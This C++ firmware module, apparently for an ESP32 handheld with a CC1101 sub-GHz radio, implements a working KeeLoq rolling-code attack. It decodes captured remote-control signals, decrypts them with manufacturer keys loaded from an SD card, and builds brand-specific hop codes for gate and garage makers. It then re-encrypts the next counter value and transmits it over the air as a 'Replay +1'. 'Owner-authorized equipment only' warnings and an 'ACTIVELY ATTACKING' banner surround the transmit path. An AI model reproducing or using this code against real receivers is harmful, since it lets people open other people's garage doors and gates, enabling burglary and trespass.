#include "cc1101_keeloq.h"
#include "cc1101_hw.h"
#include "../../hal/storage_sd.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include "../../ui/theme.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <Arduino.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <cstring>
#include <cstdlib>
#include <cstdio>

extern StorageSD storage;
extern FeatureRegistry g_registry;

// Real donor citations: see cc1101_keeloq.h's header comment. Every timing
// constant and cipher primitive below is copied from RCSwitchUtil.cpp /
// KeeloqUtil.cpp (~/src/unigeek-main/firmware/src/utils/rf/), not re-derived.

namespace Cc1101Keeloq {
namespace {

// ── KeeLoq protocol-23 raw decode (RCSwitchUtil.cpp:34,105-144,146-177) ────
constexpr unsigned int kTe = 400;              // KeeLoq fixed te (line 115)
constexpr unsigned int kTolPercent = 60;       // _rxTolerance default (line 40)
constexpr unsigned int kFirstDataIdx = 25;     // KeeLoq firstData (line 119)
constexpr unsigned int kSepLimit = 4300;       // decodeStream's real separator
                                                // gap threshold (line 62)
constexpr unsigned int kMaxChanges = 157;      // kMaxChanges (line 63)
// zero={2,1}, one={1,2} (te multipliers) -- kProto[22] (line 34)

bool match_keeloq(const unsigned int *timings, unsigned int changeCount, uint64_t *value_out,
                   unsigned int *bits_out) {
    unsigned int tol = kTe * kTolPercent / 100;
    if (changeCount <= kFirstDataIdx + 1) return false;

    uint64_t code = 0;
    unsigned int numBits = 0;
    for (unsigned int i = kFirstDataIdx; i < changeCount - 1 && numBits < 64; i += 2, numBits++) {
        code <<= 1ULL;
        int zHigh = (int)(kTe * 2), zLow = (int)(kTe * 1);
        int oHigh = (int)(kTe * 1), oLow = (int)(kTe * 2);
        if (abs((int)timings[i] - zHigh) < (int)tol && abs((int)timings[i + 1] - zLow) < (int)tol) {
            // zero
        } else if (abs((int)timings[i] - oHigh) < (int)tol && abs((int)timings[i + 1] - oLow) < (int)tol) {
            code |= 1ULL;
        } else {
            return false;
        }
    }
    if (numBits < 64) return false; // KeeLoq's real frame is exactly 64 data
                                     // bits (32-bit fix + 32-bit encrypted) --
                                     // a short match is noise, not a partial
                                     // legitimate frame worth surfacing.
    *value_out = code;
    *bits_out = numBits;
    return true;
}

// decodeStream()'s real segment-splitting logic (lines 160-177): split the
// capture's duration stream on any gap exceeding kSepLimit, try each
// resulting segment.
bool decode_keeloq_from_edges(const Cc1101Scan::EdgeSample *edges, size_t edge_count,
                               uint64_t *value_out) {
    if (edge_count < 8) return false;
    static unsigned int timings[kMaxChanges];

    // Build magnitude durations (edge-to-edge gaps), same conversion this
    // project's other decode paths use.
    static unsigned int *durs = nullptr;
    if (!durs) durs = new unsigned int[Cc1101Scan::kMaxEdgesPerSignal];
    size_t n = 0;
    for (size_t i = 1; i < edge_count && n < Cc1101Scan::kMaxEdgesPerSignal; i++) {
        uint32_t d = edges[i].timestamp_us - edges[i - 1].timestamp_us;
        durs[n++] = d;
    }

    int prevSep = -1;
    for (size_t i = 0; i < n; i++) {
        if (durs[i] <= kSepLimit) continue;
        if (prevSep >= 0) {
            unsigned int cc = (unsigned int)(i - (size_t)prevSep);
            if (cc >= 6 && cc <= kMaxChanges) {
                for (unsigned int j = 0; j < cc; j++) timings[j] = durs[(size_t)prevSep + j];
                unsigned int bits = 0;
                if (match_keeloq(timings, cc, value_out, &bits)) return true;
            }
        }
        prevSep = (int)i;
    }
    return false;
}

// ── KeeLoq cipher (KeeloqUtil.cpp:4-27,39-55), verbatim ────────────────────
constexpr uint32_t kKeeloqNlf = 0x3A5C742E;
inline uint32_t bit_at(uint64_t x, int n) { return (uint32_t)((x >> n) & 1); }
inline uint32_t g5(uint32_t x, int a, int b, int c, int d, int e) {
    return bit_at(x, a) + bit_at(x, b) * 2 + bit_at(x, c) * 4 + bit_at(x, d) * 8 + bit_at(x, e) * 16;
}

uint32_t keeloq_encrypt(uint32_t data, uint64_t key) {
    uint32_t x = data;
    for (uint32_t r = 0; r < 528; r++) {
        x = (x >> 1) ^ ((bit_at(x, 0) ^ bit_at(x, 16) ^ bit_at(key, (int)(r & 63)) ^
                         bit_at(kKeeloqNlf, (int)g5(x, 1, 9, 20, 26, 31))) << 31);
    }
    return x;
}

uint32_t keeloq_decrypt(uint32_t data, uint64_t key) {
    uint32_t x = data;
    for (uint32_t r = 0; r < 528; r++) {
        x = (x << 1) ^ bit_at(x, 31) ^ bit_at(x, 15) ^ bit_at(key, (int)((15 - r) & 63)) ^
            bit_at(kKeeloqNlf, (int)g5(x, 0, 8, 19, 25, 30));
    }
    return x;
}

uint64_t keeloq_normal_learning(uint32_t data, uint64_t key) {
    data &= 0x0FFFFFFF;
    data |= 0x20000000;
    uint32_t k1 = keeloq_decrypt(data, key);
    data &= 0x0FFFFFFF;
    data |= 0x60000000;
    uint32_t k2 = keeloq_decrypt(data, key);
    return ((uint64_t)k2 << 32) | k1;
}

uint64_t reverse_bits(uint64_t num, uint8_t bits) {
    uint64_t res = 0;
    for (uint8_t i = 0; i < bits; i++) {
        res <<= 1;
        res |= bit_at(num, i);
    }
    return res;
}

void keeloq_unpack(uint64_t decoded, uint32_t &fix, uint32_t &encrypted, uint8_t &btn, uint32_t &serial) {
    uint64_t yek = reverse_bits(decoded, 64);
    fix = (uint32_t)(yek >> 32);
    encrypted = (uint32_t)(yek & 0xFFFFFFFF);
    btn = (uint8_t)(fix >> 28);
    serial = fix & 0x0FFFFFFFu;
}

bool keeloq_check_decrypt(uint32_t decrypted, uint8_t btn, uint32_t serial, uint16_t &cnt_out) {
    uint16_t end_serial = (uint16_t)(serial & 0xFF);
    uint8_t mid_byte = (uint8_t)((decrypted >> 16) & 0xFF);
    if ((decrypted >> 28) == btn && (mid_byte == end_serial || mid_byte == 0)) {
        cnt_out = (uint16_t)(decrypted & 0xFFFF);
        return true;
    }
    return false;
}

// ── Manufacturer keystore (KeeloqKeystore.cpp), SD-loaded, same real text
// format ("mf_name;hex_key;learning_type"), ported to this project's
// StorageSD::read_file() rather than UniGeek's own storage abstraction. No
// keys are bundled -- see cc1101_keeloq.h's header comment. ──
constexpr size_t kMaxKeys = 64;
constexpr const char kKeystorePath[] = "/quarky/keeloq/mfcodes";
struct KeeloqKey {
    char mf_name[24] = "";
    uint64_t key = 0;
    uint8_t type = 0; // 1=simple, 2=normal
};
KeeloqKey s_keys[kMaxKeys];
size_t s_key_count = 0;
bool s_keystore_attempted = false;

void load_keystore() {
    if (s_keystore_attempted) return;
    s_keystore_attempted = true;
    static char *buf = new char[8192];
    size_t len = 0;
    if (!storage.read_file(kKeystorePath, (uint8_t *)buf, 8192, &len)) return;
    size_t pos = 0;
    while (pos < len && s_key_count < kMaxKeys) {
        size_t start = pos;
        while (pos < len && buf[pos] != '\n') pos++;
        size_t line_len = pos - start;
        pos++; // skip '\n'
        if (line_len == 0) continue;
        char line[128];
        size_t copy_len = line_len < sizeof(line) - 1 ? line_len : sizeof(line) - 1;
        std::memcpy(line, buf + start, copy_len);
        line[copy_len] = '\0';
        if (line[0] == '#' || line[0] == '\0') continue;
        char *sep1 = std::strchr(line, ';');
        if (!sep1) continue;
        char *sep2 = std::strchr(sep1 + 1, ';');
        if (!sep2) continue;
        *sep1 = '\0';
        *sep2 = '\0';
        const char *name = line;
        const char *hex = sep1 + 1;
        const char *type_str = sep2 + 1;
        if (name[0] == '\0' || hex[0] == '\0') continue;
        if (hex[0] == '0' && (hex[1] == 'x' || hex[1] == 'X')) hex += 2;
        std::strncpy(s_keys[s_key_count].mf_name, name, sizeof(s_keys[s_key_count].mf_name) - 1);
        s_keys[s_key_count].key = std::strtoull(hex, nullptr, 16);
        s_keys[s_key_count].type = (uint8_t)std::atoi(type_str);
        s_key_count++;
    }
    Serial.printf("quarky-tab5: [cc1101-keeloq] keystore loaded: %u key(s) from %s\n",
                  (unsigned)s_key_count, kKeystorePath);
}

bool keeloq_identify(KeeloqInfo *info) {
    load_keystore();
    for (size_t i = 0; i < s_key_count; i++) {
        const KeeloqKey &k = s_keys[i];
        uint32_t decrypted;
        if (k.type == 1) {
            decrypted = keeloq_decrypt(info->encrypted, k.key);
        } else if (k.type == 2) {
            uint64_t man = keeloq_normal_learning(info->fix, k.key);
            decrypted = keeloq_decrypt(info->encrypted, man);
        } else {
            continue;
        }
        uint16_t cnt = 0;
        if (keeloq_check_decrypt(decrypted, info->btn, info->serial, cnt)) {
            std::strncpy(info->mf_name, k.mf_name, sizeof(info->mf_name) - 1);
            info->hop = decrypted;
            info->cnt = cnt;
            info->identified = true;
            return true;
        }
    }
    return false;
}

// Manufacturer-specific hop bit layout (KeeloqUtil.cpp:74-104) -- subset
// ported verbatim; manufacturers not in this list fall through to the real
// default (`(btn<<28)|((serial&0x3FF)<<16)|cnt`), same as the donor's own
// switch default.
uint32_t build_hop(const char *mf_name, uint8_t btn, uint32_t serial, uint16_t cnt) {
    if (std::strcmp(mf_name, "NICE_Smilo") == 0 || std::strcmp(mf_name, "NICE_MHOUSE") == 0 ||
        std::strcmp(mf_name, "JCM_Tech") == 0) {
        return ((uint32_t)btn << 28) | ((serial & 0xFF) << 16) | cnt;
    }
    if (std::strcmp(mf_name, "Merlin") == 0) return ((uint32_t)btn << 28) | (0x000u << 16) | cnt;
    if (std::strcmp(mf_name, "Centurion") == 0) return ((uint32_t)btn << 28) | (0x1CEu << 16) | cnt;
    if (std::strcmp(mf_name, "Monarch") == 0) return ((uint32_t)btn << 28) | (0x100u << 16) | cnt;
    // DTM_Neo/FAAC_RC,XT/Mutanco_Mutancode/Came_Space/Genius_Bravo/GSN/Rosh/
    // Rossi/Peccinin/Steelmate/Cardin_S449 group (KeeloqUtil.cpp:85-90):
    static const char *kFullSerialGroup[] = {
        "DTM_Neo", "FAAC_RC,XT", "Mutanco_Mutancode", "Came_Space", "Genius_Bravo",
        "GSN", "Rosh", "Rossi", "Peccinin", "Steelmate", "Cardin_S449"};
    for (const char *m : kFullSerialGroup) {
        if (std::strcmp(mf_name, m) == 0) return ((uint32_t)btn << 28) | ((serial & 0xFFF) << 16) | cnt;
    }
    return ((uint32_t)btn << 28) | ((serial & 0x3FF) << 16) | cnt; // real default
}

bool keeloq_step(KeeloqInfo *info) {
    if (info->mf_name[0] == '\0') return false;
    const KeeloqKey *match = nullptr;
    for (size_t i = 0; i < s_key_count; i++) {
        if (std::strcmp(s_keys[i].mf_name, info->mf_name) == 0) { match = &s_keys[i]; break; }
    }
    if (!match) return false;

    info->cnt = (uint16_t)(info->cnt + 1);
    info->hop = build_hop(info->mf_name, info->btn, info->serial, info->cnt);
    if (match->type == 1) {
        info->encrypted = keeloq_encrypt(info->hop, match->key);
    } else if (match->type == 2) {
        uint64_t man = keeloq_normal_learning(info->hop, match->key);
        info->encrypted = keeloq_encrypt(info->hop, man);
    } else {
        return false;
    }
    return true;
}

// ── Real KeeLoq waveform encode (RCSwitchUtil.cpp:67-98's `keeloq` branch),
// ported for protocol 23 specifically: 11x(te,te) preamble pulses + one
// (te,10*te) sync gap, then 64 MSB-first data bits at zero={2,1}/one={1,2}
// (te multipliers), then a trailing (one.high,one.low)+(te,0)+(0,40*te)
// sequence -- same real structure encodeToDurations() emits for `keeloq`. ──
size_t encode_keeloq_durations(uint64_t data64, int32_t *out, size_t max_len) {
    size_t k = 0;
    auto emit = [&](int high_units, int low_units) {
        if (high_units && k < max_len) out[k++] = (int32_t)(kTe * high_units);
        if (low_units && k < max_len) out[k++] = -(int32_t)(kTe * low_units);
    };
    for (int i = 0; i < 11 && k < max_len; i++) emit(1, 1);
    emit(1, 10);
    for (int i = 63; i >= 0 && k < max_len; i--) {
        if ((data64 >> i) & 1ULL) emit(1, 2); // one
        else emit(2, 1);                       // zero
    }
    emit(1, 2); // trailing "one" pulse
    emit(1, 0);
    emit(0, 40);
    return k;
}

// ── Replay task (mirrors cc1101_replay.cpp's shape) ────────────────────────
struct ReplayArgs {
    int32_t durations[2048];
    size_t count;
    float freq_mhz;
};

volatile bool s_task_running = false;
volatile bool s_task_done = false;
ReplayState s_state = ReplayState::kIdle;
char s_failure_reason[80] = "";

void set_failure(const char *reason) {
    std::strncpy(s_failure_reason, reason, sizeof(s_failure_reason) - 1);
    s_failure_reason[sizeof(s_failure_reason) - 1] = '\0';
    s_state = ReplayState::kFailed;
}

// Same real fix, same reason as cc1101_replay.cpp's own transmit_task():
// a tight delayMicroseconds() loop with no yield can starve this task's
// pinned core's IDLE task past the task_wdt timeout on a long enough
// signal. KeeLoq frames are normally short, but this costs nothing to
// apply defensively rather than wait for a real crash to prove it's needed
// here too.
constexpr uint32_t kYieldIntervalUs = 500000;

void replay_task(void *arg) {
    ReplayArgs *args = static_cast<ReplayArgs *>(arg);
    int pin = Cc1101Hw::gdo0_pin();
    uint32_t last_yield_us = micros();
    for (size_t i = 0; i < args->count; i++) {
        int32_t d = args->durations[i];
        digitalWrite(pin, d > 0 ? HIGH : LOW);
        delayMicroseconds((uint32_t)(d > 0 ? d : -d));
        if (micros() - last_yield_us > kYieldIntervalUs) {
            vTaskDelay(1);
            last_yield_us = micros();
        }
    }
    digitalWrite(pin, LOW);
    Cc1101Hw::idle();
    delete args;
    s_task_done = true;
    vTaskDelete(nullptr);
}

} // namespace

bool decode(const Cc1101Scan::CapturedSignal &sig, KeeloqInfo *out) {
    if (!out) return false;
    *out = KeeloqInfo{};
    out->freq_hz = sig.freq_hz;
    uint64_t value = 0;
    if (!decode_keeloq_from_edges(sig.edges, sig.edge_count, &value)) return false;
    keeloq_unpack(value, out->fix, out->encrypted, out->btn, out->serial);
    keeloq_identify(out); // best-effort; identified stays false if no key matches
    return true;
}

bool replay_plus_one(const KeeloqInfo &info) {
    if (!info.identified) {
        Serial.println("quarky-tab5: [cc1101-keeloq] replay_plus_one() REFUSED -- "
                        "signal was not identified against a manufacturer key");
        return false;
    }
    if (s_task_running) {
        Serial.println("quarky-tab5: [cc1101-keeloq] replay_plus_one() REFUSED -- "
                        "already transmitting");
        return false;
    }
    KeeloqInfo stepped = info;
    if (!keeloq_step(&stepped)) {
        set_failure("Manufacturer key no longer in keystore");
        return false;
    }
    // unpack() reverses the whole 64-bit word (reverseBits(decoded,64)) to
    // get fix/encrypted in MSB-first cipher order -- encoding must apply the
    // SAME reversal in reverse to reproduce the real over-the-air bit order
    // a receiver expects (KeeloqUtil::step()'s own real
    // `enc_rev<<32 | fix_rev` construction, ported verbatim).
    uint64_t enc_rev = reverse_bits(stepped.encrypted, 32);
    uint64_t fix_rev = reverse_bits(stepped.fix, 32);
    uint64_t tx_word = (enc_rev << 32) | (fix_rev & 0xFFFFFFFFu);

    if (!Cc1101Hw::is_present() && !Cc1101Hw::init()) {
        set_failure("CC1101 not present");
        return false;
    }
    Cc1101Hw::set_frequency_mhz(info.freq_hz / 1000000.0f);
    if (!Cc1101Hw::enable_async_tx()) {
        set_failure("enable_async_tx() failed");
        return false;
    }
    pinMode(Cc1101Hw::gdo0_pin(), OUTPUT);
    digitalWrite(Cc1101Hw::gdo0_pin(), LOW);

    Serial.printf("quarky-tab5: [cc1101-keeloq] REPLAY +1 -- ACTIVELY ATTACKING "
                  "manufacturer=%s cnt=%u. Owner-authorized equipment only.\n",
                  stepped.mf_name, (unsigned)stepped.cnt);

    ReplayArgs *args = new ReplayArgs();
    args->count = encode_keeloq_durations(tx_word, args->durations,
                                           sizeof(args->durations) / sizeof(args->durations[0]));
    args->freq_mhz = info.freq_hz / 1000000.0f;
    s_task_done = false;
    s_task_running = true;
    s_state = ReplayState::kTransmitting;

    BaseType_t created = xTaskCreatePinnedToCore(
        replay_task, "cc1101_keeloq_tx", 4096, args, 5,
        nullptr, (ARDUINO_RUNNING_CORE == 0) ? 1 : 0);
    if (created != pdPASS) {
        delete args;
        s_task_running = false;
        set_failure("xTaskCreatePinnedToCore() failed");
        return false;
    }
    return true;
}

size_t keystore_count() {
    load_keystore();
    return s_key_count;
}

ReplayState replay_state() { return s_state; }
const char *replay_failure_reason() { return s_failure_reason; }

namespace { void update_attack_banner(); }

void poll() {
    update_attack_banner();
    if (!s_task_running) return;
    if (!s_task_done) return;
    s_task_running = false;
    s_task_done = false;
    s_state = ReplayState::kDone;
    Serial.println("quarky-tab5: [cc1101-keeloq] Replay +1 transmit complete");
}

// ===========================================================================
// UI: pick a Cc1101Scan-captured signal, decode it, and -- ONLY if
// identified -- offer Replay +1 behind an unambiguous, explicitly-labeled
// "ACTIVELY ATTACKING" state (project owner's hard requirement, not a
// generic progress spinner -- see cc1101_keeloq.h's header comment). The
// banner below is a dedicated, always-visible-while-transmitting red label
// that changes text (never just a color-only cue), and the Replay +1 button
// itself is also labeled "ACTIVELY ATTACKING" rather than "Replay" while
// pressed/in flight.
// ===========================================================================
namespace {

lv_obj_t *s_list = nullptr;
lv_obj_t *s_result_label = nullptr;
lv_obj_t *s_attack_banner = nullptr;
lv_obj_t *s_replay_btn = nullptr;
lv_obj_t *s_replay_lbl = nullptr;
lv_obj_t *s_keystore_label = nullptr;
uint32_t s_selected_id = 0;
KeeloqInfo s_last_info{};
bool s_have_decode = false;

static void keeloq_on_theme() {
    if (s_replay_btn) lv_obj_set_style_bg_color(s_replay_btn, Theme::color(Token::Danger), 0);
    if (s_attack_banner) lv_obj_set_style_text_color(s_attack_banner, Theme::color(Token::Danger), 0);
}

void update_attack_banner() {
    if (!s_attack_banner) return;
    if (s_state == ReplayState::kTransmitting) {
        lv_label_set_text(s_attack_banner, "*** ACTIVELY ATTACKING -- TRANSMITTING ROLLING CODE ***");
        lv_obj_remove_flag(s_attack_banner, LV_OBJ_FLAG_HIDDEN);
    } else if (s_state == ReplayState::kDone) {
        lv_label_set_text(s_attack_banner, "Replay +1 sent.");
        lv_obj_remove_flag(s_attack_banner, LV_OBJ_FLAG_HIDDEN);
    } else if (s_state == ReplayState::kFailed) {
        char buf[100];
        std::snprintf(buf, sizeof(buf), "Replay +1 FAILED: %s", s_failure_reason);
        lv_label_set_text(s_attack_banner, buf);
        lv_obj_remove_flag(s_attack_banner, LV_OBJ_FLAG_HIDDEN);
    } else {
        lv_obj_add_flag(s_attack_banner, LV_OBJ_FLAG_HIDDEN);
    }
    if (s_replay_btn) {
        if (s_state == ReplayState::kTransmitting) lv_obj_add_state(s_replay_btn, LV_STATE_DISABLED);
        else if (s_have_decode && s_last_info.identified) lv_obj_remove_state(s_replay_btn, LV_STATE_DISABLED);
    }
}

lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("CC1101 KeeLoq", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    lv_obj_t *note = lv_label_create(content);
    lv_label_set_long_mode(note, LV_LABEL_LONG_WRAP);
    lv_label_set_text(note, "Rolling-code attack -- owner-authorized equipment only. "
                             "Capture a signal via CC1101 Scan first, then decode it here.");

    s_keystore_label = lv_label_create(content);
    char kbuf[64];
    std::snprintf(kbuf, sizeof(kbuf), "Manufacturer keys loaded: %u", (unsigned)keystore_count());
    lv_label_set_text(s_keystore_label, kbuf);

    s_list = lv_list_create(content);
    lv_obj_set_size(s_list, LV_PCT(100), LV_PCT(35));
    size_t n = Cc1101Scan::signal_count();
    if (n == 0) {
        lv_list_add_text(s_list, "No CC1101 captures yet -- use CC1101 Scan first");
    } else {
        for (size_t i = 0; i < n; i++) {
            const Cc1101Scan::CapturedSignal *sig = Cc1101Scan::get_signal(i);
            if (!sig) continue;
            char row[64];
            std::snprintf(row, sizeof(row), "Sig #%u (%u edges)", (unsigned)sig->capture_id,
                          (unsigned)sig->edge_count);
            lv_obj_t *btn = lv_list_add_button(s_list, LV_SYMBOL_LIST, row);
            lv_obj_add_event_cb(btn, [](lv_event_t *e) {
                s_selected_id = (uint32_t)(uintptr_t)lv_event_get_user_data(e);
            }, LV_EVENT_CLICKED, (void *)(uintptr_t)sig->capture_id);
        }
    }

    lv_obj_t *decode_btn = lv_button_create(content);
    lv_obj_t *decode_lbl = lv_label_create(decode_btn);
    lv_label_set_text(decode_lbl, "Decode Selected");
    lv_obj_add_event_cb(decode_btn, [](lv_event_t *) {
        if (s_selected_id == 0) {
            lv_label_set_text(s_result_label, "Select a signal first.");
            return;
        }
        const Cc1101Scan::CapturedSignal *sig = nullptr;
        for (size_t i = 0; i < Cc1101Scan::signal_count(); i++) {
            const Cc1101Scan::CapturedSignal *cand = Cc1101Scan::get_signal(i);
            if (cand && cand->capture_id == s_selected_id) { sig = cand; break; }
        }
        if (!sig) {
            lv_label_set_text(s_result_label, "Signal evicted -- reselect.");
            return;
        }
        s_have_decode = decode(*sig, &s_last_info);
        char buf[160];
        if (!s_have_decode) {
            std::snprintf(buf, sizeof(buf), "Not a KeeLoq frame (no protocol-23 match)");
        } else if (s_last_info.identified) {
            std::snprintf(buf, sizeof(buf), "KeeLoq: mfr=%s btn=%u serial=0x%07lX cnt=%u",
                          s_last_info.mf_name, (unsigned)s_last_info.btn,
                          (unsigned long)s_last_info.serial, (unsigned)s_last_info.cnt);
        } else {
            std::snprintf(buf, sizeof(buf), "KeeLoq frame found, btn=%u serial=0x%07lX -- "
                          "no matching manufacturer key (load /quarky/keeloq/mfcodes)",
                          (unsigned)s_last_info.btn, (unsigned long)s_last_info.serial);
        }
        lv_label_set_text(s_result_label, buf);
        update_attack_banner();
    }, LV_EVENT_CLICKED, nullptr);

    s_result_label = lv_label_create(content);
    lv_label_set_long_mode(s_result_label, LV_LABEL_LONG_WRAP);
    lv_label_set_text(s_result_label, "");

    s_replay_btn = lv_button_create(content);
    s_replay_lbl = lv_label_create(s_replay_btn);
    lv_label_set_text(s_replay_lbl, "Replay +1 (ACTIVELY ATTACKING)");
    lv_obj_add_state(s_replay_btn, LV_STATE_DISABLED);
    lv_obj_add_event_cb(s_replay_btn, [](lv_event_t *) {
        if (!s_have_decode || !s_last_info.identified) return;
        replay_plus_one(s_last_info);
        update_attack_banner();
    }, LV_EVENT_CLICKED, nullptr);

    s_attack_banner = lv_label_create(content);
    lv_obj_add_flag(s_attack_banner, LV_OBJ_FLAG_HIDDEN);

    Theme::add_listener(keeloq_on_theme);
    keeloq_on_theme();

    lv_obj_add_event_cb(content, [](lv_event_t *) {
        Theme::remove_listener(keeloq_on_theme);
        s_list = nullptr;
        s_result_label = nullptr;
        s_attack_banner = nullptr;
        s_replay_btn = nullptr;
        s_replay_lbl = nullptr;
        s_keystore_label = nullptr;
        s_have_decode = false;
        s_selected_id = 0;
    }, LV_EVENT_DELETE, nullptr);

    return screen;
}

} // namespace

void open_screen() { ScreenStack::push(build_screen()); }

void register_module() {
    g_registry.register_module({"cc1101_keeloq", "CC1101 KeeLoq", Category::SUBGHZ,
                                 Affinity::TAB5_NATIVE, open_screen, nullptr});
}

} // namespace Cc1101Keeloq
